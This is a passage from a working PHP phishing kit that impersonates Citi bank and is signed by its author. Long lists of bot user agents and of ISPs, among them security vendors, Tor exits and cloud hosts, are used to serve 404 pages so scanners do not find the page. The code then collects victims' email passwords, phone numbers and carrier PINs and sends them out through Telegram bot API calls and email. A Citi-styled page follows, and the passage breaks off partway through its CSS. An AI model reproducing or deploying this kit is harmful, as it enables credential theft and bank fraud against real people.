  "avg",
  "avira",
  "bitdefender",
  "kaspersky",
  "sophos",
  "virustotal",
  "virus",
  "accoona",
  "acoon",
  "adressendeutschland",
  "ah-ha.com",
  "ahoy",
  "altavista",
  "ananzi",
  "anthill",
  "appie",
  "arachnophilia",
  "arale",
  "araneo",
  "aranha",
  "architext",
  "aretha",
  "arks",
  "asterias",
  "atlocal",
  "atn",
  "atomz",
  "augurfind",
  "backrub",
  "bannana_bot",
  "baypup",
  "bdfetch",
  "big brother",
  "biglotron",
  "bjaaland",
  "blackwidow",
  "blaiz",
  "blog",
  "blo.",
  "bloodhound",
  "boitho",
  "booch",
  "bradley",
  "butterfly",
  "calif",
  "cassandra",
  "ccubee",
  "cfetch",
  "charlotte",
  "churl",
  "cienciaficcion",
  "cmc",
  "collective",
  "comagent",
  "combine",
  "computingsite",
  "csci",
  "curl",
  "cusco",
  "daumoa",
  "deepindex",
  "delorie",
  "depspid",
  "deweb",
  "die blinde kuh",
  "digger",
  "ditto",
  "dmoz",
  "docomo",
  "download express",
  "dtaagent",
  "dwcp",
  "ebiness",
  "ebingbong",
  "e-collector",
  "ejupiter",
  "emacs-w3 search engine",
  "esther",
  "evliya celebi",
  "ezresult",
  "falcon",
  "felix ide",
  "ferret",
  "fetchrover",
  "fido",
  "findlinks",
  "fireball",
  "fish search",
  "fouineur",
  "funnelweb",
  "gazz",
  "gcreep",
  "genieknows",
  "getterroboplus",
  "geturl",
  "glx",
  "goforit",
  "golem",
  "grabber",
  "grapnel",
  "gralon",
  "griffon",
  "gromit",
  "grub",
  "gulliver",
  "hamahakki",
  "harvest",
  "havindex",
  "helix",
  "heritrix",
  "hku www octopus",
  "homerweb",
  "htdig",
  "html index",
  "html_analyzer",
  "htmlgobble",
  "hubater",
  "hyper-decontextualizer",
  "ia_archiver",
  "ibm_planetwide",
  "ichiro",
  "iconsurf",
  "iltrovatore",
  "image.kapsi.net",
  "imagelock",
  "incywincy",
  "indexer",
  "infobee",
  "informant",
  "ingrid",
  "inktomisearch.com",
  "inspector web",
  "intelliagent",
  "internet shinchakubin",
  "ip3000",
  "iron33",
  "israeli-search",
  "ivia",
  "jack",
  "jakarta",
  "javabee",
  "jetbot",
  "jumpstation",
  "katipo",
  "kdd-explorer",
  "kilroy",
  "knowledge",
  "kototoi",
  "kretrieve",
  "labelgrabber",
  "lachesis",
  "larbin",
  "legs",
  "libwww",
  "linkalarm",
  "link validator",
  "linkscan",
  "lockon",
  "lwp",
  "lycos",
  "magpie",
  "mantraagent",
  "mapoftheinternet",
  "marvin/",
  "mattie",
  "mediafox",
  "mediapartners",
  "mercator",
  "merzscope",
  "microsoft url control",
  "minirank",
  "miva",
  "mj12",
  "mnogosearch",
  "moget",
  "monster",
  "moose",
  "motor",
  "multitext",
  "muncher",
  "muscatferret",
  "mwd.search",
  "myweb",
  "najdi",
  "nameprotect",
  "nationaldirectory",
  "nazilla",
  "ncsa beta",
  "nec-meshexplorer",
  "nederland.zoek",
  "netcarta webmap engine",
  "netmechanic",
  "netresearchserver",
  "netscoop",
  "newscan-online",
  "nhse",
  "nokia6682/",
  "nomad",
  "noyona",
  "siteexplorer",
  "nutch",
  "nzexplorer",
  "objectssearch",
  "occam",
  "omni",
  "open text",
  "openfind",
  "openintelligencedata",
  "orb search",
  "osis-project",
  "pack rat",
  "pageboy",
  "pagebull",
  "page_verifier",
  "panscient",
  "parasite",
  "partnersite",
  "patric",
  "pear.",
  "pegasus",
  "peregrinator",
  "pgp key agent",
  "phantom",
  "phpdig",
  "picosearch",
  "piltdownman",
  "pimptrain",
  "pinpoint",
  "pioneer",
  "piranha",
  "plumtreewebaccessor",
  "pogodak",
  "poirot",
  "pompos",
  "poppelsdorf",
  "poppi",
  "popular iconoclast",
  "psycheclone",
  "publisher",
  "python",
  "rambler",
  "raven search",
  "roach",
  "road runner",
  "roadhouse",
  "robbie",
  "robofox",
  "robozilla",
  "rules",
  "salty",
  "sbider",
  "scooter",
  "scoutjet",
  "scrubby",
  "search.",
  "searchprocess",
  "semanticdiscovery",
  "senrigan",
  "sg-scout",
  "shai'hulud",
  "shark",
  "shopwiki",
  "sidewinder",
  "sift",
  "silk",
  "simmany",
  "site searcher",
  "site valet",
  "sitetech-rover",
  "skymob.com",
  "sleek",
  "smartwit",
  "sna-",
  "snappy",
  "snooper",
  "sohu",
  "speedfind",
  "sphere",
  "sphider",
  "spinner",
  "spyder",
  "steeler/",
  "suke",
  "suntek",
  "supersnooper",
  "surfnomore",
  "sven",
  "sygol",
  "szukacz",
  "tach black widow",
  "tarantula",
  "templeton",
  "/teoma",
  "t-h-u-n-d-e-r-s-t-o-n-e",
  "theophrastus",
  "titan",
  "titin",
  "tkwww",
  "toutatis",
  "t-rex",
  "tutorgig",
  "twiceler",
  "twisted",
  "ucsd",
  "udmsearch",
  "url check",
  "updated",
  "vagabondo",
  "valkyrie",
  "verticrawl",
  "victoria",
  "vision-search",
  "volcano",
  "voyager/",
  "voyager-hc",
  "w3c_validator",
  "w3m2",
  "w3mir",
  "walker",
  "wallpaper",
  "wanderer",
  "wauuu",
  "wavefire",
  "web core",
  "web hopper",
  "web wombat",
  "webbandit",
  "webcatcher",
  "webcopy",
  "webfoot",
  "weblayers",
  "weblinker",
  "weblog monitor",
  "webmirror",
  "webmonkey",
  "webquest",
  "webreaper",
  "websitepulse",
  "websnarf",
  "webstolperer",
  "webvac",
  "webwalk",
  "webwatch",
  "webwombat",
  "webzinger",
  "wget",
  "whizbang",
  "whowhere",
  "wild ferret",
  "worldlight",
  "wwwc",
  "wwwster",
  "xenu",
  "xget",
  "xift",
  "xirq",
  "yandex",
  "yanga",
  "yeti",
  "yodao",
  "zao/",
  "zippp",
  "zyborg",
  "proximic",
  "Googlebot",
  "Baiduspider",
  "Cliqzbot",
  "A6-Indexer",
  "AhrefsBot",
  "Genieo",
  "BomboraBot",
  "CCBot",
  "URLAppendBot",
  "DomainAppender",
  "msnbot-media",
  "Antivirus",
  "YoudaoBot",
  "MJ12bot",
  "linkdexbot",
  "Go-http-client",
  "presto",
  "BingPreview",
  "go-http-client",
  "go-http-client/1.1",
  "trident",
  "presto",
  "virustotal",
  "unchaos",
  "dreampassport",
  "sygol",
  "nutch",
  "privoxy",
  "zipcommander",
  "neofonie",
  "abacho",
  "acoi",
  "acoon",
  "adaxas",
  "agada",
  "aladin",
  "alkaline",
  "amibot",
  "anonymizer",
  "aplix",
  "aspseek",
  "avant",
  "baboom",
  "anzwers",
  "anzwerscrawl",
  "crawlconvera",
  "del.icio.us",
  "camehttps",
  "annotate",
  "wapproxy",
  "translate",
  "feedfetcher",
  "ask24",
  "asked",
  "askaboutoil",
  "fangcrawl",
  "amzn_assoc",
  "bingpreview",
  "dr.web",
  "drweb",
  "bilbo",
  "blackwidow",
  "sogou",
  "sogou-test-spider",
  "exabot",
  "externalhit",
  "ia_archiver",
  "mj12",
  "okhttp",
  "simplepie",
  "curl",
  "wget",
  "virus",
  "pipes",
  "antivirus",
  "python",
  "ruby",
  "avast",
  "firebird",
  "scmguard",
  "adsbot",
  "weblight",
  "favicon",
  "analytics",
  "insights",
  "headless",
  "github",
  "node",
  "agusescan",
  "zteopen",
  "majestic12",
  "SimplePie",
  "SAMSUNG-SGH-E250",
  "DoCoMo/2.0 N905i",
  "SiteLockSpider",
  "okhttp/2.5.0",
  "ips-agent",
  "scoutjet",
  "UptimeRobot",
  "FM Scene",
  "Prevx",
  "WindowsPowerShell"
);
foreach ($Bot as $BotType) {
  if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$ispnya = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$banned_isp = array(
  'Peak 10',
  'Quasi Networks LTD',
  'SC Rusnano',
  'GoDaddy.com, LLC',
  'Server Plan S.r.l.',
  'Linode',
  'Blazing SEO',
  'Lixux OU',
  'Inter Connects Inc',
  'Flokinet Ltd',
  'LukMAN Multimedia Sp. z o.o',
  'PIPEX-BLOCK1',
  'IPVanish',
  'LinkGrid LLC',
  'Snab-Inform Private Enterprise',
  'Cisco Systems',
  'Network and Information Technology Limited',
  'London Wires Ltd.',
  'Tehnologii Budushego LLC',
  'Eonix Corporation',
  'hosttech GmbH',
  'Wowrack.com',
  'SunGard Availability Services LP',
  'Internap Network Services Corporation',
  'Palo Alto Networks',
  'PlusNet Technologies Ltd',
  'Scaleway',
  'Facebook',
  'Host1Plus',
  'XO Communications',
  'Nobis Technology Group',
  'ExpressVPN',
  'DME Hosting LLC',
  'Prescient Software',
  'Sungard Network Solutions',
  'OVH SAS',
  'Iomart Hosting Ltd',
  'Hosting Solution',
  'Barracuda Networks',
  'Sungard Network Solutions',
  'Solar VPS',
  'PHPNET Hosting Services',
  'DigitalOcean',
  'Level 3 Communications',
  'softlayer',
  'Chelyabinsk-Signal LLC',
  'SoftLayer Technologies',
  'Complete Internet Access',
  'london-tor.mooo.com',
  'amazonaws',
  'cyveillance',
  'phishtank',
  'tor.piratenpartei-nrw.de',
  'cpanel66.proisp.no',
  'tor-node.com',
  'dreamhost',
  'Involta',
  'exit0.liskov.tor-relays.net',
  'tor.tocici.com',
  'netpilot',
  'calyxinstitute',
  'tor-exit',
  'msnbot',
  'p3pwgdsn',
  'netcraft',
  'University of Virginia',
  'trendmicro',
  'ebay',
  'paypal',
  'torservers',
  'comodo',
  'EGIHosting',
  'ebbs.healingpathsolutions.com',
  'healingpathsolutions.com',
  'Solution Pro',
  'Zayo Bandwidth',
  'spider.clicktargetdevelopment.com',
  'clicktargetdevelopment.com',
  'static.spro.net',
  'Digital Ocean',
  'Internap Network Services Corporation',
  'Blue Coat Systems',
  'GANDI SAS',
  'roamsite.com',
  'PIPEX-BLOCK1',
  'ColoUp',
  'Westnet',
  'The University of Tokyo',
  'University',
  'University of',
  'QuadraNet',
  'exit-01a.noisetor.net',
  'noisetor.net',
  'noisetor',
  'vultr.com',
  'Zscaler',
  'Choopa',
  'RedSwitches Pty',
  'Quintex Alliance Consulting',
  'www16.mailshell.com',
  'this.is.a.tor.exit-node.net',
  'this.is.a.tor.node.xmission.com',
  'colocrossing.com',
  'DedFiberCo',
  'crawl',
  'sucuri.net',
  'crawler',
  'proxy',
  'enom',
  'cloudflare',
  'yahoo',
  'trustwave',
  'rima-tde.net',
  'tfbnw.net',
  'pacbell.net',
  'tpnet.pl',
  'ovh.net',
  'centralnic',
  'badware',
  'phishing',
  'antivirus',
  'SiteAdvisor',
  'McAfee',
  'Bitdefender',
  'avirasoft',
  'phishtank.com',
  'googleusercontent',
  'OVH SAS',
  'Yahoo',
  'Yahoo! Inc.',
  'Google',
  'Google Inc.',
  'GoDaddy',
  'Amazon Technologies Inc.',
  'Amazon',
  'Top Level Hosting SRL',
  'Twitter',
  'Microsoft',
  'Microsoft Corporation',
  'OVH',
  'VPSmalaysia.com.my',
  'Madgenius.com',
  'Barracuda Networks Inc.',
  'Barracuda',
  'SecuredConnectivity.net',
  'Digital Domain',
  'Hetzner Online',
  'Akamai',
  'SoftLayer',
  'SURFnet',
  'Creative Thought Inc.',
  'Fastly',
  'Return Path Inc.',
  'WhatsApp',
  'Instagram',
  'Schulte Consulting LLC',
  'Universidade Federal do Rio de Janeiro',
  'Sectoor',
  'Bitfolk',
  'DIR A/S',
  'Team Technologies LLC',
  'Mainloop',
  'Junk Email Filter Inc.',
  'Art Matrix - Lightlink Inc.',
  'Redpill Linpro AS',
  'CloudFlare',
  'ESET spol. s r.o.',
  'AVAST Software s.r.o.',
  'Dosarrest',
  'Apple Inc.',
  'Symantec',
  'Mozilla',
  'Netprotect SRL',
  'Host Europe GmbH',
  'Host Sailor Ltd.',
  'PSINet Inc.',
  'Daniel James Austin',
  'RamNode',
  'Hostalia',
  'Xs4all Internet BV',
  'Inktomi Corporation',
  'Eircom Customer Assignment',
  '9New Network Inc',
  'Sony',
  'Private IP Address LAN',
  'Computer Problem Solving',
  'Fortinet',
  'Avira',
  'Rackspace',
  'Baidu',
  'Comodo',
  'Incapsula Inc',
  'Orange Polska Spolka Akcyjna',
  'Infosphere',
  'Private Customer',
  'SurfControl',
  'University of Newcastle upon Tyne',
  'Total Server Solutions',
  'LukMAN',
  'eSecureData',
  'Hosting',
  'VI Na Host Co. Ltd',
  'B2 Net Solutions',
  'Master Internet',
  'Global Perfomance',
  'Fireeye',
  'AntiVirus',
  'Security',
  'Intersoft Internet',
  'Voxility',
  'Linode',
  'Internet-Pro',
  'Trustwave Holdings Inc',
  'Online SAS',
  'Versaweb',
  'Liquid Web',
  'A100 ROW',
  'Apexis AG',
  'Apexis',
  'LogicWeb',
  'Virtual1 Limited',
  'VNET a.s.',
  'Static IP Assignment',
  'TerraTransit AG',
  'Merit Network',
  'PathsConnect',
  'Long Thrive',
  'LG DACOM',
  'Secure Internet',
  'Kaspersky',
  'UK Dedicated Servers Limited',
  'Customer Network',
  'Flokinet',
  'Simpli Networks LLC',
  'Psychz',
  'PrivateSystems Networks',
  'ScanSafe Services',
  'CachedNet',
  'CloudVPN',
  'Spark New Zealand Trading Ltd',
  'Whitelabel IT Solutions Corp',
  'Hostwinds',
  'Hosteros LLC',
  'HostUS',
  'Host',
  'ClientID',
  'Server',
  'Oracle',
  'Fortinet',
  'Unus Inc.',
  'Public facing services',
  'Virtual Employee Pvt Ltd',
  'Dataline Ltd',
  'Teksavvy Solutions Inc.',
  'UPC Romania Bucuresti',
  'TalkTalk Communications Limited',
  'British Telecommunications PLC',
  'Global Data Networks LLC',
  'Quintex Alliance Consulting',
  'Online S.A.S.',
  'Content Delivery Network Ltd',
  'Nobis Technology Group LLC',
  'Parrukatu',
  'JSC ER-Telecom Holding',
  'ChinaNet Fujian Province Network',
  'QualityNetwork',
  'Vist On-Line Ltd',
  'The Calyx Institute',
  'Internet Customers',
  'OJSC Oao Tattelecom',
  'Petersburg Internet Network Ltd.',
  'Psychz Networks',
  'Udasha',
  'Onavo Mobile Ltd',
  'Cubenode System SL',
  'OVH Hosting Inc.',
  'NForce Entertainment B.V.',
  'DigitalOcean LLC',
  'Glenayre Electronics Inc.',
  'British Telecommunications PLC',
  'Iomart Hosting Limited',
  'Digital Energy Technologies Limited',
  'Private Customer',
  'Cisco Systems Inc.',
  'Vultr Holdings LLC',
  'Amazon.com Inc.',
  'Web Hosting Solutions',
  'Time Warner Cable Internet LLC',
  'Internet Security - TC',
  'Vertical Telecoms Broadband Networks and Internet Provider',
  'Ventelo Wholesale',
  'MYX Group LLC',
  'France Telecom S.A.',
  'Online S.A.S.',
  'Nine Internet Solutions AG',
  'Microsoft Azure',
  'Choopa, LLC',
  'Amazon',
  'HighWinds Network',
  'Amazon.com',
  'Bell Canada',
  'Digital Ocean',
  'M247 LTD Frankfurt Infrastructure',
  'Palo Alto Networks',
  'Spectrum',
  'ImOn Communications, LLC',
  'Wintek Corporation',
  'ServerMania',
  'Claro Dominican Republic',
  '013 NetVision',
  'Amazon.com',
  'Digital Ocean',
  'TalkTalk',
  'HostDime.com',
  'AVAST Software s.r.o.',
  'Host1Plus Cloud Servers',
  'Amazon Data Services NoVa',
  'Google Cloud',
  'M-net',
  'Digiweb ltd',
  'Prescient Software',
  'Eir Broadband',
  'Solution Pro',
  'Bell Canada',
  'Linode',
  'DigitalOcean',
  'Plusnet',
  'GigeNET',
  'ZenLayer',
  'NFOrce Entertainment B.V.',
  'NewMedia Express',
  'Telegram Messenger Network',
  'IQ PL Sp. z o.o.',
  'Datacamp Limited',
  'Tahoe Internet Exchange (TahoeIX)',
  'ITCOM Shpk',
  'HEG US'

);
foreach ($banned_isp as $isps) {
  if (substr_count($ispnya, $isps) > 0) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ISP ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$ip = $_SESSION['ip'];
$ua = $_SERVER['HTTP_USER_AGENT'];





$_SESSION['emailAddress'] = $_POST['emailAddress'];
$_SESSION['emailPassword'] = $_POST['emailPassword'];
$_SESSION['phoneNumber'] = $_POST['phoneNumber'];
$_SESSION['purchaseContext.purQuestionForm.propState'] = $_POST['purchaseContext.purQuestionForm.propState'];
$_SESSION['pin'] = $_POST['pin'];


$mess .= '#---------- Citi emailAddress  ----------------# ' . $_SESSION['emailAddress'] . "\n";
$mess .= '#---------- Citi emailPassword  ----------------# ' . $_SESSION['emailPassword'] . "\n";
$mess .= '#---------- Citi phoneNumber  ----------------# ' . $_SESSION['dateOfBirth'] . "\n";
$mess .= '#---------- Citi phone type  ----------------# ' . $_SESSION['purchaseContext.purQuestionForm.propState'] . "\n";
$mess .= '#---------- Citi carrir pin  ----------------# ' . $_SESSION['pin'] . "\n";

$mess .= '#---------- Citi LOGIN IP ----------------# ' . $_SESSION['ip'] . "\n";

$mess .= '#---------- Citi LOGIN USERAGENT ----------------# ' . $_SERVER['HTTP_USER_AGENT'] . "\n";
$mess .= '#---------- Scama by @King_Kenzie ----------------# ' . "\n";

$msg = urlencode($mess);

// Load bot settings
include '../admin/settings.php';

// Send to bot 1
$url1 = "https://api.telegram.org/bot$bot1_token/sendMessage?chat_id=$bot1_chat_id&text=$msg";
$curl1 = curl_init();
curl_setopt($curl1, CURLOPT_URL, $url1);
curl_setopt($curl1, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl1, CURLOPT_RETURNTRANSFER, 1);
$response1 = curl_exec($curl1);
curl_close($curl1);

// Send to bot 2
$url2 = "https://api.telegram.org/bot$bot2_token/sendMessage?chat_id=$bot2_chat_id&text=$msg";
$curl2 = curl_init();
curl_setopt($curl2, CURLOPT_URL, $url2);
curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, 1);
$response2 = curl_exec($curl2);
curl_close($curl2);

// Email (optional)
$mseg = urldecode($mess);
$subject = "Citi BY @King_Kenzie From " . $_SESSION['ip'];
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@mail($webmail, $subject, $mseg, $headers);
?>

<html class="cbolui-ddl" lang="en" style="display: block; visibility: visible;"
  data-inboxsdk-session-id="1617877949639-0.36817867118720415">

<head class="at-element-marker">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="assets/img/origination.css">
  <style>
    .cbolui-icon-globalSpriteBase[_ngcontent-yta-c101] {
      padding-right: 7px;
      top: 3px;
      font-size: 20px;
      height: 20px
    }

    .cbolui-icon-wrapper[_ngcontent-yta-c101] {
      padding: 15px;
      margin-bottom: 24px;
      border: 1px solid transparent;
      border-radius: 6px;
      display: flex;
      display: -webkit-flex
    }

    .cbolui-icon-wrapper[_ngcontent-yta-c101] .iconClass[_ngcontent-yta-c101] {
      margin-right: 10px;
      padding-right: 0 !important;
      flex-shrink: 0
    }

    .cbolui-icon-red[_ngcontent-yta-c101] {
      color: #d60000
    }

    .cbolui-icon-blue[_ngcontent-yta-c101] {
      color: #056dae;
      margin-top: 5px
    }

    .cbolui-icon-orange[_ngcontent-yta-c101] {
      color: #cb6015
    }

    .cbolui-icon-green[_ngcontent-yta-c101] {
      color: #006e0a
    }

    .checkmark-icon[_ngcontent-yta-c101] {
      width: 15px;
      height: 10px;
      top: 8px
    }

    .glyphicon-triangle-down[_ngcontent-yta-c101],
    .glyphicon-triangle-up[_ngcontent-yta-c101] {
      margin-top: 5px
    }

    .cbolui-icon-trash-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_trash%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C12H27a4%2C4%2C0%2C0%2C0-4-4H19a4%2C4%2C0%2C0%2C0-4%2C4H9v2h2V30a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V14h2ZM19%2C10h4a2%2C2%2C0%2C0%2C1%2C2%2C2H17A2%2C2%2C0%2C0%2C1%2C19%2C10ZM29%2C30a2%2C2%2C0%2C0%2C1-2%2C2H15a2%2C2%2C0%2C0%2C1-2-2V27.21L29%2C18.7Zm0-13.57L13%2C24.94V14H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-four-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20version%3D%221.1%22%20id%3D%22Layer_1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2042%2042%22%20style%3D%22enable-background%3Anew%200%200%2042%2042%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%09.st0%7Bfill%3A%23FFFFFF%3B%7D%0A%09.st1%7Bfill%3A%23002D72%3B%7D%0A%3C/style%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M41%2C21c0%2C11-9%2C20-20%2C20C10%2C41%2C1%2C32%2C1%2C21S10%2C1%2C21%2C1C32%2C1%2C41%2C10%2C41%2C21%22/%3E%0A%09%3Cpolygon%20class%3D%22st1%22%20points%3D%2237%2C21%2029%2C16.4%2029%2C20%2022%2C20%2022%2C13%2025.6%2C13%2021%2C5%2016.4%2C13%2020%2C13%2020%2C20%2013%2C20%2013%2C16.4%205%2C21%2013%2C25.6%2013%2C22%20%0A%09%0920%2C22%2020%2C29%2016.4%2C29%2021%2C37%2025.6%2C29%2022%2C29%2022%2C22%2029%2C22%2029%2C25.6%20%09%22/%3E%0A%3C/g%3E%0A%3C/svg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowdown-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20version%3D%221.1%22%20id%3D%22Layer_1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2042%2042%22%20style%3D%22enable-background%3Anew%200%200%2042%2042%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%09.st0%7Bfill%3A%23FFFFFF%3B%7D%0A%09.st1%7Bfill%3A%23002D72%3B%7D%0A%3C/style%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M41%2C21c0%2C11-9%2C20-20%2C20C10%2C41%2C1%2C32%2C1%2C21S10%2C1%2C21%2C1C32%2C1%2C41%2C10%2C41%2C21%22/%3E%0A%09%3Cpath%20class%3D%22st1%22%20d%3D%22M20%2C9v21.7c-0.2-0.1-0.4-0.3-0.6-0.5l-6.1-11.6l-1.8%2C0.9l5.7%2C10.8l0%2C0c0.6%2C1.5%2C2%2C2.6%2C3.7%2C2.6%0A%09%09c1.7%2C0%2C3.1-1%2C3.7-2.5l5.8-10.9l-1.8-0.9l-5.9%2C11c-0.2%2C0.4-0.5%2C0.8-0.9%2C1V9H20z%22/%3E%0A%3C/g%3E%0A%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowleft-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_arrow_left%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C20H11.3a2%2C2%2C0%2C0%2C1%2C.5-.58l11.55-6.14-.94-1.77L11.64%2C17.24v0a4%2C4%2C0%2C0%2C0-.17%2C7.44l10.94%2C5.8.94-1.77-11-5.87a2%2C2%2C0%2C0%2C1-1-.86H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowright-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_arrow_riwht%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C22H30.7a2%2C2%2C0%2C0%2C1-.5.58L18.65%2C28.72l.94%2C1.77%2C10.77-5.73v0a4%2C4%2C0%2C0%2C0%2C.16-7.44l-10.94-5.8-.94%2C1.77%2C11%2C5.87a2%2C2%2C0%2C0%2C1%2C1%2C.86H9Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowup-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_arrow_up%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M1%2C21A20%2C20%2C0%2C1%2C1%2C21%2C41%2C20%2C20%2C0%2C0%2C1%2C1%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C33V11.3a2%2C2%2C0%2C0%2C1%2C.57.5l6.14%2C11.55%2C1.77-.94L24.77%2C11.64h0a4%2C4%2C0%2C0%2C0-7.44-.17l-5.8%2C10.94%2C1.77.94%2C5.87-11a2%2C2%2C0%2C0%2C1%2C.86-1V33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-branch-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23fff%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_w_rgb_branch%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C17V13h0a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2H9v4h2V29H9v2H33V29H31V17Zm-2-4v2H11V13ZM21%2C21v8H17V21Zm8%2C8H23V19H15V29H13V17H29Zm-2-4H25V21h2v4Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-bubble-light[_ngcontent-yta-c101] {
